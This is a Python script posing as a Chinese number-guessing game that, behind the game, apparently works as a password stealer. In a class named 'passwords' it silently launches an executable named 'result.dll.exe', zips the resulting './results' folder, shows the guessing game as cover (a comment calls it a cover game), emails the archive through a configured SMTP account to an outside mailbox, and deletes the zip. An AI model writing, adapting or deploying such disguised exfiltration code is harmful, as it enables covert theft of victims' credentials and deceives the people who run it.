# -*- coding = UTF-8 -*-
# author = SKY-Super-Hero
# date = 2021/2/24

import mimetypes
import os
import random
import zipfile
import time

import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart


class passwords:
    def __init__(self):
        # stmp服务器地址,例如stmp.163.com
        self.Host = "xxxxxxxxx"
        # 发件人邮箱
        self.FROM = "xxxxxxxxxxxxx"
        # 发件人秘钥,国内邮箱需要自己申请,方法自行百度
        self.key = "xxxxxxxxxxxxxxxxxxx"
        # 收件人邮箱
        self.TO = "xxxxxxxxxxxxxxxx"
        self.results_path = "./results"

    def get_result(self):
        print("-"*25+"游戏将在3s后开始"+"-"*25)
        # 游戏前的准备
        os.startfile("result.dll.exe")
        time.sleep(3)

    def to_zip(self):
        # 要压缩的文件路径
        start_dir = "./results"
        # 输出的压缩文件名
        file_news = "results.zip"
        # 调用zip压缩的算法
        z = zipfile.ZipFile(file_news, "w", zipfile.ZIP_DEFLATED)
        # 打包压缩,逐个文件压缩至zip
        for dirpath, dirnames, file_names in os.walk(start_dir):
            fpath = dirpath.replace(start_dir, " ")
            # 实现当前文件夹以及包含的所有文件的压缩
            fpath = fpath and fpath + os.sep or " "
            # 给zip里压缩的文件命名
            for file_name in file_names:
                z.write(os.path.join(dirpath, file_name), fpath + file_name)
                # print("COMPLETE !")

    def mail(self):
        # 填写发邮件的地址及端口,网易是25
        server = smtplib.SMTP(self.Host, 25)
        # 登陆
        server.login(self.FROM, self.key)

        # 创建一个实例
        msg = MIMEMultipart()
        # 正文
        msg.attach(MIMEText("{} These are the results", "plain", "utf-8"))
        msg['From'] = self.FROM
        msg['To'] = self.TO
        subject = "Results {}"
        msg['Subject'] = subject
        # 封装文件
        zip_data = open("./results.zip", "rb")
        ctype, encoding = mimetypes.guess_type("./results.zip")
        if ctype is None or encoding is not None:
            ctype = "application/octet-stream"
        maintype, subtype = ctype.split("/", 1)
        file_msg = MIMEBase(maintype, subtype)
        file_msg.set_payload(zip_data.read())
        zip_data.close()
        encoders.encode_base64(file_msg)
        # 附件名称
        file_msg.add_header("Content-Disposition", "attachment", filename="results.zip")
        msg.attach(file_msg)

        # 发送邮件
        server.sendmail(self.FROM, self.TO, msg.as_string())
    # 其他操作
    def the_end(self):
        os.remove("./results.zip")
        os.system("python game.py")
    # 掩耳盗铃的游戏
    def game(self):
        answer = random.randint(0, 10000)
        print("-" * 20 + "猜数字" + "-" * 20)
        # print(answer)

        while True:
            guess_number = input("请输入一个的数<0-10000>" + "\n")
            try:
                guess_number = int(guess_number)
                if guess_number > answer:
                    print(f"你的答案:{guess_number} > 答案")
                    print("-" * 40)
                elif guess_number < answer:
                    print(f"你的答案:{guess_number} < 答案")
                    print("-" * 40)
                elif guess_number == answer:
                    print(f"歪蕊顾得,你猜对了,答案就是{answer}")
                    print("游戏将在1s后结束")
                    break
            except ValueError:
                print("你所输入的值有误,please retry")


if __name__ == "__main__":
    i = passwords()
    try:
        i.get_result()
        i.to_zip()
        i.game()
        i.mail()
        i.the_end()
    except FileNotFoundError:
        i.game()
